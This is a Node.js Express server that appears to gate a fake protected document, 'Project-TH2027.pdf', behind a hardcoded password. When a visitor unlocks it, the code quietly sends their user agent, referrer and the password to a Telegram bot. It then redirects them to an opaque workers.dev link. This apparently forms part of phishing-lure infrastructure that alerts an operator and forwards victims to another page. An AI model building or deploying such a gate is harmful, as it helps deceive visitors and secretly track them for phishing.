// server.js
const express = require('express');
const axios = require('axios'); // Or use native fetch in Node 18+
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// Middleware to parse JSON bodies
app.use(express.json());
// Serve the static HTML file
app.use(express.static(__dirname));

// The correct password (also move this to an env var for better security!)
const CORRECT_CODE = process.env.DOCUMENT_PASSWORD || "2027219";

app.post('/api/unlock', async (req, res) => {
  const { password, userAgent, referrer } = req.body;

  if (password === CORRECT_CODE) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.error("Missing Telegram environment variables");
      return res.status(500).json({ error: "Server configuration error" });
    }

    const now = new Date().toLocaleString('en-US', { 
      timeZone: 'America/New_York',
      year: 'numeric', month: 'short', day: 'numeric',
      hour: '2-digit', minute: '2-digit', second: '2-digit'
    });

    const message = 
      `🔓 *SUCCESSFUL UNLOCK* 🔓\n` +
      `📄 Document: Project-TH2027.pdf\n` +
      `🕒 Time: ${now}\n` +
      `🌐 User Agent: ${userAgent || 'unknown'}\n` +
      `🔗 Referrer: ${referrer || 'direct'}\n` +
      `✅ Password Used: ${password}\n` +
      `👤 Client accessed the document.`;

    try {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      });
      
      // Success: Tell the frontend to redirect
      res.json({ success: true, redirectUrl: "https://project-th2027-5f1bc0.meridiancgca.workers.dev/?k=ihjUNoYT9Loq_u5yP_bxTCuI" });
    } catch (error) {
      console.error("Telegram API Error:", error.message);
      res.status(500).json({ error: "Failed to process request" });
    }
  } else {
    // Failure: Incorrect password
    res.status(401).json({ success: false, error: "That password is incorrect. Try again." });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
